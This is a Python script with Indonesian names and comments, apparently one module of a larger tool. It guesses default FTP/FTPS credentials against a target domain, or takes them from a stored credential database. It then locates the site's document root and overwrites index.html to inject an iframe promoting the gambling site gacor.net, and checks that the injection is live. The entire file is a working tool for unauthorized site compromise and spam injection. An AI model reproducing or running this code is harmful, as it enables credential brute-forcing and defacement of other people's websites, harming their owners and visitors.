"""Kanal tanam: sisipkan materi ke situs target lewat kanal yang tersedia.

Kanal pertama: FTP/FTPS -> cari docroot -> tambal berkas -> verifikasi live.
Dipakai dari terminal maupun dari API.
"""
import argparse
import socket
import ssl
import sys
import time
import urllib.request
from ftplib import FTP_TLS
from io import BytesIO

SISIP = """
<section id="hestia-gacor" style="max-width:1100px;margin:24px auto;padding:0 16px">
  <h2 style="font:600 20px system-ui;margin:0 0 12px">BOSGACOR &mdash; gacor.net</h2>
  <iframe src="https://gacor.net/" title="gacor.net" loading="lazy"
    style="width:100%;height:900px;border:1px solid #e5e7eb;border-radius:12px;background:#fff"></iframe>
</section>
"""

DOCROOT = ["public_html", "www", "htdocs", "httpdocs", "public", "web",
           "domains/%s/public_html"]
BERKAS = ["index.html", "index.htm"]
PASANGAN = [("ftp", "ftp"), ("ftp", "anonymous"), ("admin", "admin"),
            ("admin", "123456"), ("user", "user"), ("www", "www"),
            ("webmaster", "webmaster"), ("hosting", "hosting")]


def catat(x):
    print(x, flush=True)


class Implisit(FTP_TLS):
    """FTPS implisit (port 990): TLS sejak awal, tanpa AUTH."""

    def connect(self, host="", port=990, timeout=-999, source_address=None):
        if timeout != -999:
            self.timeout = timeout
        self.host, self.port = host, port
        sock = socket.create_connection((host, port), self.timeout)
        self.sock = self.context.wrap_socket(sock, server_hostname=host)
        self.af = self.sock.family
        self.file = self.sock.makefile("r", encoding=self.encoding)
        self.welcome = self.getresp()
        return self.welcome


def sambung(host, user, sandi, port=21, implisit=False, timeout=8):
    ctx = ssl._create_unverified_context()
    if implisit:
        f = Implisit(context=ctx, timeout=timeout)
        f.connect(host, port)
        f.login(user, sandi, secure=False)
    else:
        f = FTP_TLS(context=ctx, timeout=timeout)
        f.connect(host, port)
        f.login(user, sandi)
    try:
        f.prot_p()
    except Exception:
        pass
    f.set_pasv(True)
    return f


def sapu(host, port=21, implisit=False, timeout=8):
    catat("   sapu port %s (%s) - %d pasangan, timeout %ds" % (port, "implisit" if implisit else "eksplisit", len(PASANGAN), timeout))
    for u, p in PASANGAN:
        try:
            f = sambung(host, u, p, port=port, implisit=implisit, timeout=timeout)
            pwd = f.pwd()
            catat("     OK   %-14s -> pwd=%s" % (u, pwd))
            try:
                f.quit()
            except Exception:
                pass
            return u, p
        except Exception as e:
            catat("     --   %-14s %s" % (u, str(e)[:58]))
            try:
                f.quit()
            except Exception:
                pass
    return None, None


def cari_docroot(f, domain):
    for d in DOCROOT:
        kandidat = d % domain if "%s" in d else d
        try:
            f.cwd(kandidat)
            return kandidat
        except Exception:
            pass
    return None


def kredensial_dari_db(domain, db="data/hestia.db"):
    import sqlite3
    try:
        c = sqlite3.connect(db)
        kol = [r[1] for r in c.execute("PRAGMA table_info(kredensial)")]
        for baris in c.execute("select * from kredensial"):
            d = dict(zip(kol, baris))
            teks = " ".join(str(v) for v in d.values() if v).lower()
            if domain.split(".")[0] in teks:
                rahasia = str(d.get("rahasia") or "")
                if ":" in rahasia:
                    u, p = rahasia.split(":", 1)
                    return u.strip(), p.strip()
                if rahasia:
                    return str(d.get("nama") or "ftp"), rahasia
    except Exception:
        pass
    return "", ""


def tanam(domain, user="", sandi="", sapu_dulu=True):
    langkah = []

    def c(x):
        langkah.append(x)
        catat(x)

    if not user and sapu_dulu:
        c("kredensial belum ada -> sapu pasangan umum")
        u, p = sapu(domain, port=21)
        if not u:
            u, p = sapu(domain, port=990, implisit=True)
        if not u:
            return {"ok": False, "pesan": "tidak ada kredensial FTP yang diterima", "langkah": langkah}
        user, sandi = u, p

    try:
        f = sambung(domain, user, sandi)
    except Exception as e:
        c("gagal sambung: %s" % e)
        return {"ok": False, "pesan": "gagal sambung FTP: %s" % e, "langkah": langkah}
    c("login OK sebagai %s | pwd=%s" % (user, f.pwd()))
    dok = cari_docroot(f, domain)
    c("docroot: %s" % dok)
    if not dok:
        f.quit()
        return {"ok": False, "pesan": "docroot tidak ditemukan", "langkah": langkah}
    f.cwd(dok)
    try:
        f.storbinary("STOR hestia-uji.txt", BytesIO(b"hestia uji tulis\n"))
        c("uji tulis: BERHASIL")
    except Exception as e:
        c("uji tulis: GAGAL (%s)" % e)
        f.quit()
        return {"ok": False, "pesan": "kredensial hanya bisa baca", "langkah": langkah}

    berkas, isi = None, ""
    for b in BERKAS:
        try:
            buf = BytesIO()
            f.retrbinary("RETR " + b, buf.write)
            berkas = b
            isi = buf.getvalue().decode("utf-8", "ignore")
            break
        except Exception:
            pass
    if not berkas:
        f.quit()
        return {"ok": False, "pesan": "berkas halaman tidak ditemukan", "langkah": langkah}
    c("berkas: %s (%d byte)" % (berkas, len(isi)))
    if "hestia-gacor" in isi:
        c("= sudah tertanam")
    else:
        baru = isi.replace("</body>", SISIP + "\n</body>", 1) if "</body>" in isi else isi + SISIP
        f.storbinary("STOR " + berkas, BytesIO(baru.encode("utf-8")))
        c("+ %s diunggah (%d byte)" % (berkas, len(baru)))
    f.quit()

    for i in range(1, 5):
        try:
            with urllib.request.urlopen("https://" + domain + "/", timeout=20) as x:
                h = x.read().decode("utf-8", "ignore")
            c("verifikasi %d: http=%s hestia-gacor=%d" % (i, x.status, h.count("hestia-gacor")))
            if "hestia-gacor" in h:
                return {"ok": True, "pesan": "materi gacor.net tampil di %s" % domain, "langkah": langkah}
        except Exception as e:
            c("verifikasi %d gagal: %s" % (i, e))
        time.sleep(8)
    return {"ok": False, "pesan": "diunggah tapi belum tampil (cek cache)", "langkah": langkah}


if __name__ == "__main__":
    a = argparse.ArgumentParser()
    a.add_argument("domain")
    a.add_argument("-u", "--user", default="")
    a.add_argument("-p", "--sandi", default="")
    a.add_argument("--sapu", action="store_true")
    o = a.parse_args()
    h = tanam(o.domain, o.user, o.sandi, sapu_dulu=o.sapu)
    print("HASIL:", h["ok"], "-", h["pesan"])
